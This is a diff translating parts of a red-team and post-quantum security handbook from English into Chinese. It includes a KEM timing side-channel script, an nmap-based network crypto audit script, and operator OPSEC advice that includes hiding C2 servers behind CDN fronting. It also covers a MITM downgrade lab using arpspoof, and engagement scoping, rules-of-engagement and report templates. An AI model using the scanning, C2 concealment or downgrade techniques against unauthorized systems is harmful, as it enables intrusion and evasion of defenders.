-N_SAMPLES     = 5_000    # Increase to 100,000+ for real analysis
-WARMUP_RUNS   = 500      # CPU cache warmup runs before measurement
+N_SAMPLES     = 5_000    # 真实分析请提高到 100,000 以上
+WARMUP_RUNS   = 500      # 测量前的 CPU 缓存预热轮数
 
 def setup_kem():
     kem = oqs.KeyEncapsulation(KEM_ALGORITHM)
@@ -2275,7 +2275,7 @@ def setup_kem():
     return kem, ciphertext
 
 def invalid_ct(valid_ct: bytes) -> bytes:
-    """Flip 1-4 random bytes to create an invalid ciphertext."""
+    """随机翻转 1-4 个字节，生成无效密文。"""
     inv = bytearray(valid_ct)
     for _ in range(secrets.randbelow(4) + 1):
         inv[secrets.randbelow(len(inv))] ^= secrets.randbelow(256)
@@ -2293,7 +2293,7 @@ def measure(kem, valid_ct: bytes, n: int):
     inv_ct = invalid_ct(valid_ct)
     
     for i in range(n):
-        # Alternate valid / invalid to avoid temporal bias:
+        # 交替执行有效/无效，避免时间偏置：
         t0 = time.perf_counter_ns()
         try: kem.decap_secret(valid_ct)
         except: pass
@@ -2336,7 +2336,7 @@ def analyze(valid_t, invalid_t):
         print(f"    Increase sample count or run on dedicated bare-metal hardware.")
     print(f"{'='*55}")
     
-    # Plot distribution:
+    # 绘制分布：
     plt.figure(figsize=(12, 5))
     plt.subplot(1, 2, 1)
     plt.hist(valid_t,   bins=80, alpha=0.6, color='blue',  label='Valid CT')
@@ -2364,13 +2364,13 @@ if __name__ == "__main__":
 
 ---
 
-### 3.5 CRYPTOGRAPHIC INVENTORY AUDIT SCRIPT
+### 3.5 密码学资产清点审计脚本
 
 ```bash
 #!/usr/bin/env bash
-# Quantum-Vulnerable Cryptography Audit Script
-# Scans a network for systems using RSA/ECDH key exchange (SNDL targets)
-# Requirements: nmap, openssl, awk, grep
+# 受量子威胁的密码学审计脚本
+# 扫描网络中使用 RSA/ECDH 密钥交换的系统（SNDL 目标）
+# 要求：nmap、openssl、awk、grep
 
 TARGET_CIDR="${1:-192.168.1.0/24}"
 OUTPUT_DIR="/tmp/crypto_audit_$(date +%Y%m%d_%H%M%S)"
@@ -2382,18 +2382,18 @@ echo "  Target: $TARGET_CIDR"
 echo "  Output: $OUTPUT_DIR"
 echo "================================================================"
 
-# Step 1: Discover live hosts and TLS-capable ports
+# 步骤 1：发现在线主机与支持 TLS 的端口
 echo "[*] Scanning for live hosts and TLS ports ..."
 nmap -sS -p 443,8443,465,993,995,8080,22 \
      --open -T4 -oG "$OUTPUT_DIR/hosts.gnmap" \
      "$TARGET_CIDR" 2>/dev/null
 
-# Extract IP:port combinations
+# 提取 IP:端口 组合
 grep "Ports:" "$OUTPUT_DIR/hosts.gnmap" | \
     awk '{for(i=1;i<=NF;i++) if($i~/\/open\//) print $2, $i}' | \
     sed 's|/.*||' > "$OUTPUT_DIR/tls_targets.txt"
 
-# Step 2: Probe TLS cipher suites per host
+# 步骤 2：逐主机探测 TLS 密码套件
 echo "[*] Probing TLS cipher suites ..."
 VULNERABLE_COUNT=0
 PQC_COUNT=0
@@ -2426,7 +2426,7 @@ while IFS=" " read -r ip port; do
     fi
 done < "$OUTPUT_DIR/tls_targets.txt"
 
-# Step 3: SSH key exchange audit
+# 步骤 3：SSH 密钥交换审计
 echo ""
 echo "[*] Auditing SSH key exchange algorithms ..."
 SSH_VULN=0
@@ -2444,7 +2444,7 @@ grep " 22$\|22 " "$OUTPUT_DIR/tls_targets.txt" 2>/dev/null | awk '{print $1}' | 
     fi
 done
 
-# Step 4: Summary
+# 步骤 4：汇总
 echo ""
 echo "================================================================"
 echo "  AUDIT SUMMARY"
@@ -2460,90 +2460,90 @@ echo "    Traffic to/from them is an SNDL collection priority."
 
 ---
 
-### 3.6 OPERATOR PQC OPSEC
+### 3.6 操作员的 PQC OPSEC
 
 ```
-THE OPERATOR IS ALSO AN SNDL TARGET:
-  You communicate with C2 servers. You send reports. You log into client infrastructure.
-  All of that traffic is visible to adversaries who are also running SNDL programs.
-  Your operational security must account for the fact that your own traffic is
-  being archived for future decryption.
+操作员本身也是 SNDL 目标：
+  你要与 C2 服务器通信。你要发报告。你要登录客户的基础设施。
+  所有这些流量，对同样在运行 SNDL 项目的对手都是可见的。
+  你的行动安全必须考虑到一个事实：你自己的流量正在
+  被归档，以便将来解密。
 
-PROTECT YOUR OWN TRAFFIC:
+保护你自己的流量：
 
-  VPN:
-    Primary: Mullvad VPN (supports WireGuard with ML-KEM hybrid since 2023)
-             Enable: Settings > VPN Settings > Quantum-Resistant Tunnels: ON
-    Secondary: ProtonVPN (quantum-resistant tunnel option under Advanced settings)
-    Avoid: VPNs without PQC support (OpenVPN with RSA = SNDL-vulnerable)
+  VPN：
+    首选：Mullvad VPN（自 2023 年起支持带 ML-KEM 混合的 WireGuard）
+             开启：设置 > VPN 设置 > 抗量子隧道：开
+    次选：ProtonVPN（高级设置中有抗量子隧道选项）
+    避免：不支持 PQC 的 VPN（用 RSA 的 OpenVPN = 受 SNDL 威胁）
 
-  SSH:
-    Add to your ~/.ssh/config and /etc/ssh/sshd_config:
+  SSH：
+    在 ~/.ssh/config 和 /etc/ssh/sshd_config 中加入：
     KexAlgorithms sntrup761x25519-sha512@openssh.com,curve25519-sha256
     HostKeyAlgorithms ssh-ed25519,sk-ssh-ed25519@openssh.com
     Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
     MACs hmac-sha2-512-etm@openssh.com
 
-    sntrup761x25519-sha512 provides hybrid post-quantum protection:
-    the classical X25519 DH plus the sntrup761 lattice-based KEM.
-    Requires OpenSSH 9.0+ (Ubuntu 22.04+ has this by default).
-    Verify: ssh -Q kex | grep sntrup
+    sntrup761x25519-sha512 提供混合后量子保护：
+    经典 X25519 DH 加上基于格问题的 sntrup761 KEM。
+    需要 OpenSSH 9.0+（Ubuntu 22.04+ 默认已带）。
+    验证：ssh -Q kex | grep sntrup
 
-  C2 Communication:
-    Sliver with mTLS: already uses modern TLS 1.3 with ECDHE.
-    For maximum OPSEC: deploy your C2 listener behind Cloudflare (CDN fronting):
-    the outer TLS connection to Cloudflare's edge uses their PQC hybrid implementation.
+  C2 通信：
+    带 mTLS 的 Sliver：本身已使用现代 TLS 1.3 与 ECDHE。
+    为最大 OPSEC：把 C2 监听器部署在 Cloudflare 之后（CDN 前置）：
+    到 Cloudflare 边缘的外层 TLS 连接使用其 PQC 混合实现。
 
-  File Storage and Reports:
-    Encrypt all reports and sensitive files with age (age-encryption.org):
-    age uses X25519 (classically secure today) but is migrating to ML-KEM.
-    For long-term storage (10+ year SNDL protection): use ML-KEM-1024 when age v2 ships.
-    For today: age + AES-256 encrypted at rest is adequate for 5-year horizon.
+  文件存储与报告：
+    用 age（age-encryption.org）加密所有报告与敏感文件：
+    age 使用 X25519（今天在经典意义上是安全的），但正在向 ML-KEM 迁移。
+    长期存储（10 年以上的 SNDL 防护）：等 age v2 发布后用 ML-KEM-1024。
+    就今天而言：age + 静态 AES-256 加密足以覆盖 5 年时间尺度。
 ```
 
 ---
 
-### 3.7 LAB PATH FOR BEGINNERS (5-WEEK STRUCTURE)
+### 3.7 初学者实验路径（5 周结构）
 
 ```
-WEEK 1: Cryptography Foundations
-  Goal: understand what is broken and why before building any tools
-  [ ] Read: "An Introduction to Mathematical Cryptography" (Hoffstein et al.) Chapters 1-4
-  [ ] Watch: "Quantum Computing for Cryptographers" (Christof Paar, YouTube, free)
-  [ ] Complete: Cryptopals challenges Set 1 (cryptopals.com): understand AES in practice
-  [ ] Lab: Run the cryptographic audit script against your home network
+第 1 周：密码学基础
+  目标：在动手做任何工具之前，先理解什么被攻破了、为什么
+  [ ] 阅读：《An Introduction to Mathematical Cryptography》（Hoffstein 等）第 1-4 章
+  [ ] 观看：“Quantum Computing for Cryptographers”（Christof Paar，YouTube，免费）
+  [ ] 完成：Cryptopals 挑战第 1 组（cryptopals.com）：在实践中理解 AES
+  [ ] 实验：对你家的网络运行密码学审计脚本
   
-WEEK 2: SNDL Infrastructure
-  [ ] Set up Zeek + tcpdump on a Raspberry Pi 4 (or Ubuntu VM with bridged NIC)
-  [ ] Run the SNDL filter for 24 hours on your home network
-  [ ] Query your ssl.log: how many connections use vulnerable cipher suites?
-  [ ] Build the SQLite index: practice tagging entries by priority
+第 2 周：SNDL 基础设施
+  [ ] 在树莓派 4（或带桥接网卡的 Ubuntu 虚拟机）上搭好 Zeek + tcpdump
+  [ ] 在你家网络上运行 SNDL 过滤器 24 小时
+  [ ] 查询你的 ssl.log：有多少连接使用受威胁的密码套件？
+  [ ] 构建 SQLite 索引：练习按优先级给条目打标签
   
-WEEK 3: PQC Library Exploration
-  [ ] Build liboqs from source: verify all ML-KEM algorithms compile
-  [ ] Run the ML-KEM timing script at 5,000 samples: observe output
-  [ ] Re-run at 50,000 samples: compare p-values
-  [ ] Lab: run on bare metal (not VM) if available: compare jitter
+第 3 周：PQC 库探索
+  [ ] 从源码编译 liboqs：验证所有 ML-KEM 算法都能编译
+  [ ] 用 5,000 个样本运行 ML-KEM 时序脚本：观察输出
+  [ ] 用 50,000 个样本重跑：比较 p 值
+  [ ] 实验：条件允许时在裸机（非虚拟机）上运行：比较抖动
   
-WEEK 4: PQC Downgrade Lab
-  [ ] Set up a lab with two VMs: one acting as a TLS client (Firefox), one as a server
-  [ ] Configure the server to offer ML-KEM hybrid TLS (nginx with OQS provider)
-  [ ] Run the downgrade script in MITM position (arpspoof between VMs)
-  [ ] Confirm in Wireshark: the resulting session uses a classical cipher suite
-  [ ] Capture the session with tcpdump and archive in your SNDL test database
+第 4 周：PQC 降级实验
+  [ ] 搭两台虚拟机的实验环境：一台作 TLS 客户端（Firefox），一台作服务器
+  [ ] 把服务器配置为提供 ML-KEM 混合 TLS（带 OQS provider 的 nginx）
+  [ ] 在中间人位置运行降级脚本（虚拟机之间用 arpspoof）
+  [ ] 在 Wireshark 中确认：最终会话使用经典密码套件
+  [ ] 用 tcpdump 捕获该会话并归档到你的 SNDL 测试库
   
-WEEK 5: Audit and Reporting
-  [ ] Run the crypto audit script against a lab network with 5+ VMs
-  [ ] Write a 2-page SNDL findings brief: which systems are at risk, why, priority
-  [ ] Research: what is your client's VPN and does it support PQC?
-  [ ] Submit a hypothetical SNDL report section as a writing exercise
+第 5 周：审计与报告
+  [ ] 对一个有 5 台以上虚拟机的实验网络运行密码学审计脚本
+  [ ] 写一份 2 页的 SNDL 发现简报：哪些系统有风险、为什么、优先级
+  [ ] 调研：你的客户用什么 VPN，是否支持 PQC？
+  [ ] 作为写作练习，提交一份假设性的 SNDL 报告章节
 ```
 
 ---
 
-## SECTION 4: RED TEAM OPERATIONS
+## 第 4 部分：红队行动
 
-> The report is what the client paid for. The attack was how you earned the right to write it. Professional red teaming requires scoping discipline, airtight documentation, and structured delivery. An operation with no report is just crime.
+> 报告才是客户付钱买的东西。攻击只是你赢得撰写权的途径。专业红队需要范围界定纪律、无懈可击的记录和结构化交付。一次没有报告的行动，只是犯罪。
 
 <div align="center">
 <table><tr><td>
@@ -2554,468 +2554,468 @@ WEEK 5: Audit and Reporting
 </div>
 ---
 
-### 4.1 PRE-ENGAGEMENT SCOPING QUESTIONNAIRE
+### 4.1 行动前范围界定问卷
 
 ```
-Send this to the client before signing the Statement of Work.
-Their answers define your legal boundary. Every item NOT authorized
-is explicitly excluded in writing. Their signature covers your actions.
+在签署工作说明书之前，把这份问卷发给客户。
+他们的回答界定了你的法律边界。每一项未获授权的
+内容都以书面形式明确排除。他们的签名覆盖你的行动。
 
 ================================================================
-RED TEAM ENGAGEMENT: PRE-SCOPE QUESTIONNAIRE
+红队行动：范围界定前问卷
 ================================================================
 
-CLIENT INFORMATION:
-  Company Name:
-  Primary Contact Name + Title:
-  Primary Contact Email + Phone:
-  Legal/Compliance Contact Name:
-  Emergency 24/7 Contact (for abort/incident): Name + Direct Cell
+客户信息：
+  公司名称：
+  主要联系人姓名 + 职务：
+  主要联系人邮箱 + 电话：
+  法务/合规联系人姓名：
+  紧急 24/7 联系人（用于中止/事件）：姓名 + 直线手机
 
-ENGAGEMENT SCOPE:
+行动范围：
 
-  1. NETWORK SCOPE
-     a. IP ranges in scope (CIDRs):
-     b. IP ranges explicitly OUT of scope:
-     c. Cloud environments in scope: [AWS / Azure / GCP / None]
-        Accounts/subscriptions:
-     d. SaaS applications in scope: [Salesforce / M365 / Workday / etc.]
-     e. Third-party environments in scope: YES / NO
+  1. 网络范围
+     a. 范围内的 IP 段（CIDR）：
+     b. 明确不在范围内的 IP 段：
+     c. 范围内的云环境：[AWS / Azure / GCP / 无]
+        账号/订阅：
+     d. 范围内的 SaaS 应用：[Salesforce / M365 / Workday / 等]
+     e. 范围内的第三方环境：是 / 否
 
-  2. PHYSICAL SCOPE
-     a. Physical locations in scope (addresses):
-     b. Physical locations OUT of scope:
-     c. Physical techniques authorized:
-        [ ] Tailgating / social entry
-        [ ] Lock bypass (picking, shimming, bypass tools)
-        [ ] RFID cloning and credential replay
-        [ ] Hardware implant deployment (LAN Turtle, similar)
-        [ ] Drone aerial recon (optical)
-        [ ] Drone thermal recon
-        [ ] Document/badge replication
-        [ ] After-hours access attempts
-        [ ] None: physical out of scope
-     d. Areas within in-scope locations that are OFF LIMITS:
+  2. 物理范围
+     a. 范围内的物理地点（地址）：
+     b. 不在范围内的物理地点：
+     c. 获授权的物理技术：
+        [ ] 尾随进入 / 社会工程进入
+        [ ] 锁具绕过（开锁、垫片、绕过工具）
+        [ ] RFID 克隆与凭证重放
+        [ ] 硬件植入部署（LAN Turtle 等）
+        [ ] 无人机航拍侦察（光学）
+        [ ] 无人机热成像侦察
+        [ ] 文件/证件复制
+        [ ] 非工作时段进入尝试
+        [ ] 无：物理不在范围内
+     d. 范围内地点中禁止进入的区域：
 
-  3. SOCIAL ENGINEERING SCOPE
-     a. Vishing authorized: YES / NO
-        If YES: which departments are in scope?
-     b. Spear phishing authorized: YES / NO
-        If YES: which groups/departments?
-        Credential harvesting in scope: YES / NO
-        Malicious file delivery in scope: YES / NO
-     c. USB drop authorized: YES / NO
-        If YES: deployment locations in scope?
-     d. Executives in scope for SE: YES / NO
-        Any executives explicitly excluded (name them):
+  3. 社会工程范围
+     a. 语音钓鱼获授权：是 / 否
+        若是：哪些部门在范围内？
+     b. 鱼叉邮件钓鱼获授权：是 / 否
+        若是：哪些组/部门？
+        凭证收集在范围内：是 / 否
+        恶意文件投递在范围内：是 / 否
+     c. USB 投放获授权：是 / 否
+        若是：范围内的投放地点？
+     d. 高管是否在社会工程范围内：是 / 否
+        有明确排除的高管（列出姓名）：
 
-  4. TECHNICAL SCOPE
-     a. Authorized attack techniques:
-        [ ] External network scanning and enumeration
-        [ ] Web application testing (OWASP Top 10)
-        [ ] Internal network compromise post-initial-access
-        [ ] Active Directory attacks (Kerberoasting, ASREP, BloodHound, ADCS)
-        [ ] ADCS exploitation (certificate template abuse)
-        [ ] Azure AD / Entra ID attacks (token theft, app registration abuse)
-        [ ] Credential dumping (LSASS, SAM, NTDS.dit)
-        [ ] Lateral movement
-        [ ] Persistence mechanisms
-        [ ] Data exfiltration (simulated)
-        [ ] Ransomware simulation (test files only)
-        [ ] Domain compromise / DC takeover simulation
-        [ ] Cloud lateral movement (Azure, AWS, GCP)
-     b. Production systems: hands-off / handle with care / full scope:
-     c. Denial of Service attacks: IN scope / OUT of scope
-     d. Destructive payloads: IN scope / OUT of scope
+  4. 技术范围
+     a. 获授权的攻击技术：
+        [ ] 外部网络扫描与枚举
+        [ ] Web 应用测试（OWASP Top 10）
+        [ ] 初始访问后的内部网络攻陷
+        [ ] Active Directory 攻击（Kerberoasting、ASREP、BloodHound、ADCS）
+        [ ] ADCS 利用（证书模板滥用）
+        [ ] Azure AD / Entra ID 攻击（令牌窃取、应用注册滥用）
+        [ ] 凭证转储（LSASS、SAM、NTDS.dit）
+        [ ] 横向移动
+        [ ] 持久化机制
+        [ ] 数据外传（模拟）
+        [ ] 勒索软件模拟（仅测试文件）
+        [ ] 域攻陷 / DC 接管模拟
+        [ ] 云上横向移动（Azure、AWS、GCP）
+     b. 生产系统：完全不碰 / 谨慎操作 / 全范围：
+     c. 拒绝服务攻击：在范围内 / 不在范围内
+     d. 破坏性载荷：在范围内 / 不在范围内
 
-  5. TIMING
-     a. Engagement start date:
-     b. Engagement end date:
-     c. Authorized attack windows:
-        [ ] Business hours only (09:00-18:00 local)
-        [ ] After hours (18:00-08:00)
-        [ ] Weekends
-        [ ] 24/7
-     d. Blackout periods (no testing): earnings announcements, board meetings, etc.
+  5. 时间安排
+     a. 行动开始日期：
+     b. 行动结束日期：
+     c. 获授权的攻击窗口：
+        [ ] 仅工作时段（当地时间 09:00-18:00）
+        [ ] 非工作时段（18:00-08:00）
+        [ ] 周末
+        [ ] 7×24
+     d. 静默期（不测试）：财报发布、董事会等
 
-  6. DETECTION AND ESCALATION
-     a. Blue team (SOC/IR) aware of engagement: YES / NO
-        If YES: deconfliction process:
-        If NO: this is a blind test. Confirm in writing.
-     b. If blue team declares an incident during the engagement:
-        Abort and call emergency contact: YES / NO
-        Continue stealth and observe response: YES / NO (advanced option)
-     c. If law enforcement is contacted:
-        Emergency contact authorized to brief law enforcement immediately: YES / NO
+  6. 检测与升级
+     a. 蓝队（SOC/IR）是否知情：是 / 否
+        若是：冲突消解流程：
+        若否：这是盲测。请书面确认。
+     b. 若蓝队在行动中宣布发生事件：
+        中止并致电紧急联系人：是 / 否
+        继续隐蔽并观察响应：是 / 否（高级选项）
+     c. 若有人报警：
+        紧急联系人获授权立即向执法部门说明：是 / 否
 
-  7. RULES OF ENGAGEMENT (confirm each):
-     [ ] No production data will be exfiltrated (simulated only)
-     [ ] Operator identifies themselves if physically detained
-     [ ] All credentials discovered will be disclosed in the report
-     [ ] No ransomware deployed against live production systems
-     [ ] Engagement abort phrase: "[PHRASE AGREED WITH CLIENT]"
-     [ ] Daily deconfliction check-in: YES / NO | Time:
+  7. 交战规则（逐项确认）：
+     [ ] 不外传任何生产数据（仅模拟）
+     [ ] 操作员在被人身扣留时表明身份
+     [ ] 发现的所有凭证都会在报告中披露
+     [ ] 不对在线生产系统投放勒索软件
+     [ ] 行动中止暗语：“[与客户商定的暗语]”
+     [ ] 每日冲突消解碰头：是 / 否 | 时间：
 
-  8. DELIVERABLES:
-     [ ] Executive Summary (non-technical, 2-3 pages)
-     [ ] Technical Report (full findings, evidence, CVSSv4 ratings)
-     [ ] Attack Narrative (chronological kill chain walkthrough)
-     [ ] Remediation Roadmap (prioritized fixes with effort estimates)
-     [ ] Re-test (remediation verification): YES / NO
-     [ ] Purple Team session: YES / NO
-     [ ] Debrief session: YES / NO
+  8. 交付物：
+     [ ] 执行摘要（非技术，2-3 页）
+     [ ] 技术报告（完整发现、证据、CVSSv4 评级）
+     [ ] 攻击叙述（按时间顺序的杀伤链复盘）
+     [ ] 修复路线图（按优先级排列的修复项与工作量估算）
+     [ ] 复测（验证修复）：是 / 否
+     [ ] 紫队演练：是 / 否
+     [ ] 复盘会：是 / 否
 
-SIGNATURE:
-  Client Authorized Signatory: _______________________ Date: ________
-  Red Team Lead:               _______________________ Date: ________
+签名：
+  客户授权签字人： _______________________ 日期： ________
+  红队负责人：     _______________________ 日期： ________
 ================================================================
 ```
 
 ---
 
-### 4.2 RULES OF ENGAGEMENT DOCUMENT
+### 4.2 交战规则文件
 
 ```
 ================================================================
-RULES OF ENGAGEMENT (ROE)
+交战规则（ROE）
 ================================================================
-Engagement ID:     [UNIQUE-ID]
-Client:            [CLIENT COMPANY NAME]
-Red Team Provider: [YOUR COMPANY NAME]
-Effective Dates:   [START] to [END]
+行动编号:     [唯一编号]
+客户:         [客户公司名称]
+红队提供商:   [你的公司名称]
+生效日期:     [开始] 至 [结束]
 
-1. AUTHORIZATION
-   This engagement is authorized by [CLIENT AUTHORIZED SIGNATORY],
-   [TITLE], [CLIENT COMPANY NAME], under the Master Services Agreement
-   dated [DATE] and Statement of Work #[NUMBER].
+1. 授权
+   本次行动由 [客户授权签字人]，
+   [职务]，[客户公司名称]，依据签订于 [日期] 的
+   主服务协议及第 [编号] 号工作说明书授权。
    
-   All red team activities within the defined scope constitute authorized
-   penetration testing under: the Computer Fraud and Abuse Act (18 USC 1030),
-   UK Computer Misuse Act 1990, and equivalent applicable statutes.
+   在既定范围内的所有红队活动，均构成依下列法规的授权
+   渗透测试：计算机欺诈与滥用法（18 USC 1030）、
+   英国 1990 年计算机滥用法，以及同等适用的法规。
 
-2. AUTHORIZED ACTIVITIES
-   Red team operators are authorized to:
-   - [Enumerate, scan, and attack IP ranges: list]
-   - [Conduct social engineering against: list]
-   - [Conduct physical testing at: list]
-   - [Deploy hardware implants at: list]
-   - [Use the following C2 domains: list]
+2. 获授权活动
+   红队操作员获授权：
+   - [列举、扫描并攻击 IP 段：清单]
+   - [对以下对象开展社会工程：清单]
+   - [在以下地点开展物理测试：清单]
+   - [在以下地点部署硬件植入：清单]
+   - [使用以下 C2 域名：清单]
 
-3. PROHIBITED ACTIVITIES (regardless of feasibility)
-   - Accessing or exfiltrating real sensitive data (PII, PHI, PCI, confidential)
-   - Deploying ransomware or wiper payloads against production systems
-   - Any activity that causes service disruption or system instability
-   - Accessing systems outside the defined scope
-   - Pivoting to third-party infrastructure not explicitly in scope
+3. 禁止的活动（无论可行性如何）
+   - 访问或外传真实敏感数据（PII、PHI、PCI、机密信息）
+   - 对生产系统投放勒索软件或擦除型载荷
+   - 任何导致服务中断或系统不稳定的活动
+   - 访问既定范围之外的系统
+   - 横向跳转到未明确列入范围的第三方基础设施
 
-4. OPERATOR IDENTIFICATION
-   All operators carry the following authorization letter at all times
-   during physical operations:
+4. 操作员身份证明
+   在物理行动期间，所有操作员全程携带以下
+   授权书：
 
-   -- AUTHORIZATION LETTER -----------------------------------------
-   [OPERATOR NAME] is conducting authorized security testing for
-   [CLIENT COMPANY NAME] under contract #[NUMBER] dated [DATE].
-   For verification, contact [CLIENT CONTACT NAME] at [DIRECT CELL].
-   Red team operator MUST comply with all lawful requests from
-   security or law enforcement personnel.
-   Signed: [CLIENT AUTHORIZED SIGNATORY] [DATE]
+   -- 授权书 -------------------------------------------------------
+   [操作员姓名] 正在为 [客户公司名称] 开展授权的安全测试，
+   依据签订于 [日期] 的第 [编号] 号合同。
+   如需核实，请联系 [客户联系人姓名]，直线手机 [直线手机]。
+   红队操作员必须遵从安保或执法人员提出的一切
+   合法要求。
+   签字：[客户授权签字人] [日期]
    ----------------------------------------------------------------
 
-5. EMERGENCY CONTACT AND ABORT PROCEDURE
-   Client Emergency Contact: [NAME] -- [DIRECT CELL 24/7]
+5. 紧急联系与中止流程
+   客户紧急联系人：[姓名] -- [24/7 直线手机]
    
-   All activity STOPS IMMEDIATELY if:
-   a. The client emergency contact speaks the abort phrase: "[PHRASE]"
-   b. A red team operator is physically detained
-   c. Any activity risks imminent harm to a person
-   d. Any activity threatens to cause unrecoverable system damage
+   出现以下情况时，所有活动立即停止：
+   a. 客户紧急联系人说出中止暗语：“[暗语]”
+   b. 红队操作员被人身扣留
+   c. 任何活动可能对人员造成迫近伤害
+   d. 任何活动可能导致不可恢复的系统损坏
    
-   On abort: all operators stop, secure equipment, identify themselves
-   to security personnel, and call the emergency contact.
+   中止时：所有操作员停止行动，收好装备，向安保人员表明身份，
+   并致电紧急联系人。
 
-6. DATA HANDLING
-   Any credentials, sensitive data, or PII encountered:
-   - Logged only as type and location (never as content)
-   - Never transmitted outside the client's infrastructure
-   - Destroyed from operator systems within 5 business days of report delivery
+6. 数据处理
+   遇到的任何凭证、敏感数据或 PII：
+   - 只记录类型和位置（绝不记录内容）
+   - 绝不传输到客户基础设施之外
+   - 在报告交付后 5 个工作日内从操作员系统中销毁
 
-SIGNATURES:
-  Red Team Lead:    ___________________ Date: ________
-  Client Signatory: ___________________ Date: ________
+签名：
+  红队负责人：   ___________________ 日期： ________
+  客户签字人：   ___________________ 日期： ________
 ================================================================
 ```
 
 ---
 
-### 4.3 REPORT STRUCTURE AND WRITING
+### 4.3 报告结构与撰写
 
 ```
-FINDING FORMAT (one page per finding):
+发现项格式（每项发现一页）：
 
   +--------------------------------------------------------------+
-  | Finding ID: F-001                                            |
-  | Title:      Credential Disclosure via Vishing                |
-  | Severity:   CRITICAL                                         |
-  | CVSSv4.0:   9.3                                              |
-  | MITRE ATT&CK: T1566.004 (Vishing)                            |
+  | 发现编号：F-001                                              |
+  | 标题：      通过语音钓鱼导致凭证泄露                         |
+  | 严重性：    严重                                             |
+  | CVSSv4.0：  9.3                                              |
+  | MITRE ATT&CK: T1566.004（语音钓鱼）                          |
   +--------------------------------------------------------------+
-  | DESCRIPTION:                                                 |
-  | During a phone call impersonating the IT help desk,          |
-  | an employee disclosed their Active Directory password and    |
-  | provided an MFA one-time code within 3 minutes of first      |
-  | contact.                                                     |
+  | 描述：                                                       |
+  | 在一次冒充 IT 服务台的电话通话中，                           |
+  | 一名员工在首次接触后 3 分钟内泄露了其                        |
+  | Active Directory 密码，并提供了 MFA                          |
+  | 一次性验证码。                                               |
   +--------------------------------------------------------------+
-  | EVIDENCE:                                                    |
-  | Screenshot: GoPhish call log [TIMESTAMP]                     |
-  | Screenshot: Successful domain authentication                 |
+  | 证据：                                                       |
+  | 截图：GoPhish 通话记录 [时间戳]                              |
+  | 截图：域认证成功                                             |
   +--------------------------------------------------------------+
-  | IMPACT:                                                      |
-  | Domain user access to all shared drives, email, and internal |
-  | applications. This access enabled all subsequent findings.   |
+  | 影响：                                                       |
+  | 该域用户身份可访问所有共享盘、邮件和内部应用。               |
+  | 这一访问权限是后续所有发现的前提。                           |
   +--------------------------------------------------------------+
-  | REMEDIATION:                                                 |
-  | 1. Implement phishing-resistant MFA (FIDO2/WebAuthn).        |
-  |    Eliminates OTP bypass. [Effort: Medium]                   |
-  | 2. Security awareness training: callback verification        |
-  |    procedure for all credential change requests. [Low]       |
-  | 3. IT helpdesk procedure: identity verification before any   |
-  |    credential operation. [Effort: Low]                       |
+  | 修复建议：                                                   |
+  | 1. 实施抗钓鱼 MFA（FIDO2/WebAuthn）。                        |
+  |    可消除 OTP 绕过。[工作量：中]                             |
+  | 2. 安全意识培训：所有凭证变更请求都执行                      |
+  |    回拨核实流程。[低]                                        |
+  | 3. IT 服务台流程：任何凭证操作前先做身份验证。               |
+  |    [工作量：低]                                              |
   +--------------------------------------------------------------+
-  | REFERENCES: MITRE ATT&CK T1566.004 | NIST SP 800-63B Sec 5.2 |
+  | 参考：MITRE ATT&CK T1566.004 | NIST SP 800-63B 第 5.2 节     |
   +--------------------------------------------------------------+
 
-SEVERITY RATINGS (CVSSv4.0 only: released October 2023):
-  Critical (9.0-10.0): direct path to complete compromise
-  High     (7.0-8.9):  significant impact, chained with 1-2 other findings
-  Medium   (4.0-6.9):  notable risk, requires favorable conditions
-  Low      (0.1-3.9):  limited impact, hardening recommendation
-  Info     (0.0):      observation / best practice suggestion
+严重性评级（仅用 CVSSv4.0：2023 年 10 月发布）：
+  严重（9.0-10.0）：直达完全攻陷的路径
+  高    （7.0-8.9）： 影响重大，与 1-2 项其他发现串联即成立
+  中    （4.0-6.9）： 风险显著，需要有利条件
+  低    （0.1-3.9）： 影响有限，属加固建议
+  信息  （0.0）：      观察记录 / 最佳实践建议
 
-CVSSv4.0 ENVIRONMENTAL SCORE ADJUSTMENT:
-  Beyond the base score: CVSSv4.0 includes Environmental metrics that adjust
-  the score for the specific client environment. These matter in 2027.
+CVSSv4.0 环境评分调整：
+  除基础分之外：CVSSv4.0 包含环境度量，可针对具体客户环境调整
+  分数。这些在 2027 年很重要。
   
-  Modified Availability Impact (MAV): if the affected system is a DR environment
-  vs. production, the score changes significantly.
+  修改后的可用性影响（MAV）：如果受影响系统是灾备环境
+  而非生产环境，分数会显著变化。
   
-  Attack Requirements (AT): "Present" vs "None" for multi-step attacks.
+  攻击要求（AT）：多步攻击时为“存在”还是“无”。
   
-  Use cvssv4calc.first.org for all calculations.
-  NEVER report a score without the vector string (e.g., CVSS:4.0/AV:N/AC:L/AT:N/...).
-  The vector string is the evidence that the score is calculated, not guessed.
+  所有计算都用 cvssv4calc.first.org。
+  绝不在没有向量串的情况下报告分数（例如 CVSS:4.0/AV:N/AC:L/AT:N/...）。
+  向量串是分数经过计算、而非猜测的证据。
 
-WRITING STYLE RULES:
-  Active voice: "We gained access to..." not "Access was gained..."
-  Past tense for narrative (it happened); present tense for vulnerability state
-  No jargon in executive summary without a brief parenthetical definition
-  Every claim of success = a screenshot or log entry as evidence
-  Remediation steps must be specific and actionable:
-    BAD:  "Improve password security"
-    GOOD: "Enforce minimum 16-character passphrases in Group Policy at
-           Computer Configuration > Windows Settings > Security Settings >
-           Account Policies > Password Policy."
-  Anonymize staff names in the final deliverable unless client requests otherwise
+写作风格规则：
+  主动语态：“我们取得了对……的访问权限”，而不是“访问权限被取得……”
+  叙述用过去时（事情已发生）；漏洞状态用现在时
+  执行摘要中不用行话，除非附简短括注定义
+  每一项成功声明 = 一张截图或一条日志作为证据
+  修复步骤必须具体、可执行：
+     差：  “改进密码安全性”
+     好：  “在组策略中强制最小 16 字符口令短语：
+           计算机配置 > Windows 设置 > 安全设置 >
+           账户策略 > 密码策略。”
+  最终交付物中对员工姓名做匿名化处理，除非客户另有要求
 ```
 
 ---
 
-### 4.4 DEBRIEF METHODOLOGY
+### 4.4 复盘方法论
 
 ```
-DEBRIEF STRUCTURE (90-minute session):
+复盘结构（90 分钟会议）：
 
-  Section 1 (10 min): What we did
-    Walk the attack narrative on a timeline visual.
-    Day 0 to Day N: one line per major milestone.
-    No jargon. The CFO who approved the budget must understand and be alarmed.
+  第 1 部分（10 分钟）：我们做了什么
+    用时间轴可视化走一遍攻击叙述。
+    第 0 天到第 N 天：每个重要节点一行。
